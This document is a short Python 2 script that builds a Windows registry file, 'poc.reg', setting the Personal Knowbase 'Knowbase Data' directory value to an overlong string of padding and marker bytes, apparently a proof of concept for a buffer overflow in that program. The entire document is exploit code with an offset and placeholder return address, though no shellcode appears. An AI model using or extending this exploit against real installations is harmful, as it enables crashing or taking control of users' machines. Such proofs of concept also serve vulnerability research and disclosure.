file="poc.reg"
 
junk1="\x41" * 272
boom="\x42\x42\x42\x42"
junk2="\x43" * 100
 
poc="Windows Registry Editor Version 5.00\n\n"
poc=poc + "[HKEY_CURRENT_USER\Software\Bitsmith Software\Personal Knowbase\Directories]\n"
poc=poc + "\"Knowbase Data\"=\"" + junk1 + boom + junk2 + "\""
 
try:
    print "[*] Creating exploit file...\n";
    writeFile = open (file, "w")
    writeFile.write( poc )
    writeFile.close()
    print "[*] File successfully created!";
except:
    print "[!] Error while creating file!";